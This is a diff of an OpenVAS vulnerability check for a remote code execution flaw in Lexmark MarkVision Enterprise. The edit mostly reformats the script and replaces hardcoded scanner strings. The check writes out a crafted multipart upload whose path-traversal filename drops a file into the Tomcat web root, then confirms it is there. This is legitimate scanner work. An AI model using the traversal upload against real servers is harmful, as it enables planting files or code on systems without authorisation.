@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_lexmark_markvision_enterprise_71623.nasl 9442 2018-04-11 12:22:50Z cfischer $
+# $Id: gb_lexmark_markvision_enterprise_71623.nasl 11466 2018-09-19 09:23:32Z cfischer $
 #
 # Lexmark MarkVision Enterprise Remote Code Execution Vulnerability
 #
@@ -27,88 +27,91 @@
 
 CPE = "cpe:/a:lexmark:markvision";
 
-if (description)
+if(description)
 {
- script_oid("1.3.6.1.4.1.25623.1.0.105171");
- script_bugtraq_id(71623);
- script_cve_id("CVE-2014-8741");
- script_tag(name:"cvss_base", value:"7.8");
- script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:N/A:N");
- script_version ("$Revision: 9442 $");
+  script_oid("1.3.6.1.4.1.25623.1.0.105171");
+  script_bugtraq_id(71623);
+  script_cve_id("CVE-2014-8741");
+  script_tag(name:"cvss_base", value:"7.8");
+  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:N/A:N");
+  script_version("$Revision: 11466 $");
 
- script_name("Lexmark MarkVision Enterprise Remote Code Execution Vulnerability");
+  script_name("Lexmark MarkVision Enterprise Remote Code Execution Vulnerability");
 
- script_xref(name:"URL", value:"http://www.securityfocus.com/bid/71623");
- script_xref(name:"URL", value:"http://support.lexmark.com/index?page=content&id=TE667&locale=EN&userlocale=EN_US");
+  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/71623");
+  script_xref(name:"URL", value:"http://support.lexmark.com/index?page=content&id=TE667&locale=EN&userlocale=EN_US");
 
- script_tag(name: "impact" , value:"Successfully exploiting this issue may allow attackers to execute
-arbitrary code in the context of affected application. Failed attacks may cause a denial-of-service condition.");
+  script_tag(name:"impact", value:"Successfully exploiting this issue may allow attackers to execute
+  arbitrary code in the context of affected application. Failed attacks may cause a denial-of-service condition.");
 
- script_tag(name: "vuldetect" , value:"Try to upload a file with a special crafted HTTP POST request.");
- script_tag(name: "solution" , value:"The vulnerability has been fixed in MarkVision Enterprise v2.1 and all future releases.");
+  script_tag(name:"vuldetect", value:"Try to upload a file with a special crafted HTTP POST request.");
 
- script_tag(name: "summary" , value:"Lexmark MarkVision Enterprise is prone to a remote code-execution
-vulnerability because it fails to sufficiently sanitize user-supplied input.");
+  script_tag(name:"solution", value:"The vulnerability has been fixed in MarkVision Enterprise v2.1 and all future releases.");
 
- script_tag(name: "affected" , value:"Versions prior to Lexmark MarkVision Enterprise 2.1 are vulnerable.");
- script_tag(name:"solution_type", value: "VendorFix");
+  script_tag(name:"summary", value:"Lexmark MarkVision Enterprise is prone to a remote code-execution
+  vulnerability because it fails to sufficiently sanitize user-supplied input.");
 
- script_tag(name:"qod_type", value:"remote_app");
+  script_tag(name:"affected", value:"Versions prior to Lexmark MarkVision Enterprise 2.1 are vulnerable.");
+  script_tag(name:"solution_type", value:"VendorFix");
 
- script_tag(name:"last_modification", value:"$Date: 2018-04-11 14:22:50 +0200 (Wed, 11 Apr 2018) $");
- script_tag(name:"creation_date", value:"2015-01-16 13:54:49 +0100 (Fri, 16 Jan 2015)");
- script_category(ACT_ATTACK);
- script_family("Web application abuses");
- script_copyright("This script is Copyright (C) 2015 Greenbone Networks GmbH");
- script_dependencies("gb_lexmark_markvision_enterprise_detect.nasl");
- script_require_ports("Services/www", 9788);
- script_mandatory_keys("lexmark_markvision_enterprise/installed");
+  script_tag(name:"qod_type", value:"remote_app");
 
- exit(0);
+  script_tag(name:"last_modification", value:"$Date: 2018-09-19 11:23:32 +0200 (Wed, 19 Sep 2018) $");
+  script_tag(name:"creation_date", value:"2015-01-16 13:54:49 +0100 (Fri, 16 Jan 2015)");
+  script_category(ACT_ATTACK);
+  script_family("Web application abuses");
+  script_copyright("This script is Copyright (C) 2015 Greenbone Networks GmbH");
+  script_dependencies("gb_lexmark_markvision_enterprise_detect.nasl");
+  script_require_ports("Services/www", 9788);
+  script_mandatory_keys("lexmark_markvision_enterprise/installed");
+
+  exit(0);
 }
 
 include("http_func.inc");
 include("host_details.inc");
 include("http_keepalive.inc");
-include("global_settings.inc");
+include("misc_func.inc");
 
 if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
 if( ! dir = get_app_location( cpe:CPE, port:port ) ) exit( 0 );
 
+useragent = get_http_user_agent();
+vtstring = get_vt_string();
+success = vtstring + '_' + rand();
+rand = rand() + '_' + rand();
+match = vtstring + ' CVE-2014-8741 Check';
+
 host = http_host_name( port:port );
 
-success = 'OpenVAS_' + rand();
-rand = rand() + '_' + rand();
+file = "/..\..\..\tomcat\webapps\ROOT\" + vtstring + ".txt";
 
-file = "/..\..\..\tomcat\webapps\ROOT\OpenVAS.txt";
-
-data = '-----------------OpenVAS\r\n' + 
+data = '-----------------' + vtstring + '\r\n' +
        'Content-Disposition: form-data; name="success"\r\n' +
        '\r\n' +
-       success + ':$fn\r\n' + 
-       '-----------------OpenVAS\r\n' +
+       success + ':$fn\r\n' +
+       '-----------------' + vtstring + '\r\n' +
        'Content-Disposition: form-data; name="failure"\r\n' +
        '\r\n' +
-       'OpenVAS::ERROR\r\n' + 
-       '-----------------OpenVAS\r\n' +
+       vtstring + '::ERROR\r\n' +
+       '-----------------' + vtstring + '\r\n' +
        'Content-Disposition: form-data; name="datafile"; filename="' + file  + '"\r\n' +
        'Content-Type: text/html\r\n' +
        '\r\n' +
-       'OpenVAS CVE-2014-8741 Check ' + rand + ' delete me\r\n' +
-       '-----------------OpenVAS--';
+       match + ' ' + rand + ' delete me\r\n' +
+       '-----------------' + vtstring + '--';
 
 len = strlen( data );
 
 req = 'POST ' + dir  + '/upload/gfd HTTP/1.1\r\n' +
       'Host: ' + host + '\r\n' +
       'Accept-Language: en\r\n' +
-      'Content-Type: multipart/form-data; boundary=---------------OpenVAS\r\n' +
+      'Content-Type: multipart/form-data; boundary=---------------' + vtstring + '\r\n' +
       'Connection: Close\r\n' +
-      'User-Agent: ' + OPENVAS_HTTP_USER_AGENT + '\r\n' +
+      'User-Agent: ' + useragent + '\r\n' +
       'Content-Length: ' + len + '\r\n' +
       '\r\n' +
       data;
-
 result = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );
 
 if( success >!< result ) exit( 99 );
@@ -121,7 +124,7 @@ if( ! isnull( r[1] ) )
   req = http_get( item:url, port:port );
   buf = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );
 
-  if( "OpenVAS CVE-2014-8741 Check" >< buf && rand >< buf )
+  if( match >< buf && rand >< buf )
   {
     report = 'It was possible to upload the file "http://' + host + ':' + port + '/' + r[1] + '". Please delete this file.';
     security_message( port:port, data:report );
